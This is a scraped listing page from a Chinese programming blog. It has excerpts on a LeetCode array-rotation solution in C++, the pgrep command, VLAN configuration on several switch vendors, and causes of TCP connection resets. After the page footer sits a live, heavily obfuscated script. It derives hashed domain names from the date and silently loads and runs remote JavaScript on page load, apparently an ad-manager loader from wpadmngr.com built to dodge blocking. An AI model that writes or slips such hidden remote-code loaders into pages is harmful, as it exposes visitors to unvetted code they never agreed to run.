			<a href="/posts/9261955eb1464267bc61ccc49b190d97/" rel="bookmark">
			算法与数据结构之数组轮转问题详解｜力扣leetcode189（cpp、Java实现）超级详细！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		189 轮转数组 数组轮转问题
力扣
方法一：分组翻转 先将整个数组翻转，然后再将前k个元素翻转，再将剩余的n-k个元素翻转。时间复杂度为O(n)，空间复杂度为O(1)。
下面是CPP的实现代码:
class Solution { public: void rotate(vector&lt;int&gt;&amp; nums, int k) { k=k%nums.size(); reverse(nums,0,nums.size()-1); reverse(nums,0,k-1); reverse(nums,k,nums.size()-1); } void reverse(vector&lt;int&gt;&amp; nums, int start, int end){ while(start&lt;end){ int t=nums[start]; nums[start]=nums[end]; nums[end]=t; start++; end--; } } }; cpp中可以利用专门的颠倒顺序的函数reverse实现。从而达到简化代码的效果：
class Solution { public: void rotate(vector&lt;int&gt;&amp; nums, int k) { int n = nums.size(); k %= n; reverse(nums.begin(), nums.end()); reverse(nums.begin(), nums.begin() + k); reverse(nums.begin() + k, nums.end()); } }; 这种方法优化了内存，但是折损了时间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9261955eb1464267bc61ccc49b190d97/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ca594f1e1cffee4a1e6a938f5526890/" rel="bookmark">
			linux shell pgrep命令使用方法（pgrep指令）获取进程号、统计进程数量（学会区分Linux进程进程名）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 问题背景pgrep指令help文档使用示例1. 列出匹配进程的PID和进程名称（-l）（默认只能从进程名的子集字符串匹配，如果要使用完整进程名的子集字符串匹配，请加-f参数，下同）2. 列出匹配进程的PID和完整的命令行（-a）3. 统计匹配进程的数量（-c）4. 使用完整的进程名称（包括参数）的子集进行匹配（-f）（如果pattern跨越进程命令与参数，需要用双引号括起来）★★★★★示例1示例2 5. 不区分大小写进行匹配（-i）6. 选择最近启动的进程（n）7. 选择最早启动的进程（-o）8. 仅匹配给定父进程的子进程（-P）9. 通过控制终端进行匹配（-t）用途命令测试步骤示例 10. 通过有效ID进行匹配（-u）用途命令测试步骤示例 11. 通过真实ID进行匹配（-U）命令示例 12. 精确匹配命令名称（-x）★★★命令示例 问题背景 按照我之前，在脚本中，获取除脚本自身进程之外与脚本同名进程号的方法：
ps -ef | grep "${SCRIPT_NAME}" | grep -v "grep" | awk '{print $2}' | grep -v "$PID" 这种方法有很大问题，莫名奇妙的，它无法正常过滤掉grep的进程（这里面还有点复杂，我一时半会也搞不明白咋回事，据说是grep会开子进程，并非grep那个子进程，而是开了一个与脚本相同的进程，导致出现问题，具体参考：linux shell脚本执行命令时创建子进程问题（特定的情况，例如后台运行、管道、分支或子shell等，脚本可能会创建子进程执行命令）grep）
后来我改用pgrep指令，用这个命令的好处是，不用使用grep命令了，它直接找出来就是进程号，而且不会带入额外的进程号，下面我们来看下pgrep指令的具体用法。
pgrep指令 pgrep命令用于根据进程的名称或其他属性来查找和列出匹配的进程ID（PID）。它可以根据不同的选项进行灵活的进程查找和过滤。
help文档 root@ubuntu:/ky/boot# pgrep --help Usage: pgrep [options] &lt;pattern&gt; Options: -d, --delimiter &lt;string&gt; specify output delimiter -l, --list-name list PID and process name -a, --list-full list PID and full command line -v, --inverse negates the matching -w, --lightweight list all TID -c, --count count of matching processes -f, --full use full process name to match -g, --pgroup &lt;PGID,.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ca594f1e1cffee4a1e6a938f5526890/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae7b5ae58c3112beb6581a9d23c46a41/" rel="bookmark">
			创建VLAN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.创建VLAN 定义：
创建VLAN目录是指在网络设备中为VLAN进行分类和组织，以便更好地管理和控制网络。具体的步骤如下：
登录到网络设备的管理界面，例如交换机或路由器的控制台。
寻找到VLAN配置的选项或菜单。这通常在网络设置或接口设置中。
创建VLAN目录。选择创建一个新的VLAN目录，并为其分配一个名称。这个名称应该能够清晰地描述目录的用途或所属部门。
在VLAN目录中添加VLAN。根据你的网络需求，逐个添加所需的VLAN到目录中。
配置每个VLAN的属性。对于每个VLAN，可以配置其ID、名称、接口分配、IP地址、子网掩码等属性。
确认和保存配置。在完成VLAN目录和VLAN的配置后，检查配置是否正确，并保存更改。
通过创建VLAN目录，你可以更好地组织和管理你的VLAN。它可以帮助你将VLAN按照不同的功能、部门或地理位置进行分类，简化网络管理和故障排除过程。请注意，在进行任何网络配置更改之前，请备份设备的配置，并确保你对网络设备的操作有足够的了解。
二.创建VLAN 定义：
创建VLAN是为了在局域网中划分逻辑上的虚拟网络，使得不同的设备可以相互通信而不受其他VLAN上的影响。VLAN可以基于不同的因素进行定义，包括：
VLAN ID：每个VLAN都有一个唯一的标识符，称为VLAN ID。它通常是一个数字，在设备中用于区分不同的VLAN。
VLAN名称：为了方便管理和识别，可以给每个VLAN分配一个简洁、易于理解的名称。
VLAN接口：可以将物理接口或端口分配给特定的VLAN，从而使得连接到这些接口的设备彼此之间可以进行通信。
VLAN参数：除了VLAN ID和名称外，还可以配置其他VLAN参数，如VLAN的IP地址、子网掩码、VLAN间路由等。
VLAN隔离：某些情况下，需要将不同的VLAN彻底隔离开来，以确保安全性和隐私性。
需要根据实际需求来定义VLAN。在定义VLAN时，应考虑网络拓扑、通信需求、安全性要求等因素，以确保网络的高效性和可靠性。
三.VLAN 命令
http://t.csdn.cn/ApNKN
四.实验
五.命令
创建VLAN的具体命令与你使用的网络设备和操作系统有关。以下是一些常见设备和操作系统的示例命令：
Cisco交换机（IOS操作系统）：
Switch# configure terminal
Switch(config)# vlan &lt;VLAN ID&gt;
Switch(config-vlan)# name &lt;VLAN名称&gt;
Switch(config-vlan)# exit
Switch(config)# interface &lt;接口&gt;
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan &lt;VLAN ID&gt;
Switch(config-if)# end
Switch# copy running-config startup-config
华为交换机（VRP操作系统）：
[Switch] sys
[Switch] vlan &lt;VLAN ID&gt;
[Switch-vlan1] quit
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae7b5ae58c3112beb6581a9d23c46a41/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04c7c00719b6a02a5aee040988391072/" rel="bookmark">
			Connection reset原因分析及解决思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Connection reset原因分析及解决思路 我们在开发过程中经常会出现Connection reset问题，包括http调用，数据库连接等场景。出现Connection reset的原因很多，本文从tcp层面简单介绍下Connection reset出现的原因和问题，以及在实际开发过程中如何排查这类问题。
1. 什么是Connection reset 在TCP首部中有6个标志位，其中一个标志位为RST，用于“复位”的。无论何时一个报文 段发往基准的连接（ referenced connection）出现错误，TCP都会发出一个复位报文段。如果双方需要继续建立连接，那么需要重新进行三次握手建立连接。
2. 出现Connection reset的原因 2.1 访问一个服务器不存在的端口 当客户端访问服务器一个没有被监听的端口时，服务端会发送RST报文
如上图所示，客户端（192.168.2.192）访问了服务端（192.168.2.1）一个未监听的端口（9090），服务端发送了RST报文。
2.2 异常终止一个连接 终止一个连接的正常方式是一方发送 FIN。有时这也称为有序释放（orderly release），因为在所有排队数据都已发送之后才发送 FIN，正常情况下没有任何数据丢失。但也有可能发送一个复位报文段而不是 FIN来中途释放一个连接。有时称这为异常释放 （abortive release）
上图，当客户端连接redis后，我们手动关闭redis服务，redis服务端会发送RST来强制终止一个连接。客户端通常收到这样的错误：Connection reset by peer，或者：远程主机强迫关闭了一个现有的连接。
2.3 半打开连接 如果一方已经关闭或异常终止连接而另一方却还不知道，我们将这样的TCP连接称为半打开（Half-Open）的。只要不打算在半打开 连接上传输数据，仍处于连接状态的一方就不会检测另一方已经出现异常
2.4 RST攻击，干扰 上面简单介绍了RST标志位的作用，很容易想到这样一个场景，如果中间网络节点想要破坏一个tcp连接，那么它只要伪造成其中一方发送RST报文到另一方，即可让双方连接失效。
上图中，三次握手建立了tcp连接，由于是https连接，需要进行加密操作。这时，对方发送RST，双方并没有进行“四次挥手”，而是连接直接失效。这时客户端发起重拾，重新建立连接，但是很快又被“对方”重置了。和客户端连接tcp连接以及发送RST报文的，都不一定是真正的服务端，而可能是中间节点。我们使用HTTPS可以避免受到中间人攻击。对方无法使用中间人攻击，但是想阻止我们访问，所以可以通过RST来重置连接
3. RST影响 当出现RST时，网关或者nginx会返回给前端502，代表服务超时或者服务中断
解决方案: 如果是多个微服务，则需要配置微服务访问和响应时间
转载自：https://www.cnblogs.com/lilinwei340/p/13021864.html
注：侵权删
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4505d9a4c2753591ef74d03f40091313/" rel="bookmark">
			创建VLAN 命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建VLAN的具体命令与你使用的网络设备和操作系统有关。以下是一些常见设备和操作系统的示例命令：
Cisco交换机（IOS操作系统）：
Switch# configure terminal
Switch(config)# vlan &lt;VLAN ID&gt;
Switch(config-vlan)# name &lt;VLAN名称&gt;
Switch(config-vlan)# exit
Switch(config)# interface &lt;接口&gt;
Switch(config-if)# switchport mode access
Switch(config-if)# switchport access vlan &lt;VLAN ID&gt;
Switch(config-if)# end
Switch# copy running-config startup-config
华为交换机（VRP操作系统）：
[Switch] sys
[Switch] vlan &lt;VLAN ID&gt;
[Switch-vlan1] quit
[Switch] interface &lt;接口&gt;
[Switch-&lt;接口&gt;] port default vlan &lt;VLAN ID&gt;
[Switch-&lt;接口&gt;] commit
[Switch] save
Juniper交换机（Junos操作系统）：
root@switch# set vlans vlan-name vlan-id &lt;VLAN ID&gt;
root@switch# set interfaces interface-name unit 0 family ethernet-switching vlan members vlan-name
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4505d9a4c2753591ef74d03f40091313/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/103/">«</a>
	<span class="pagination__item pagination__item--current">104/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/105/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>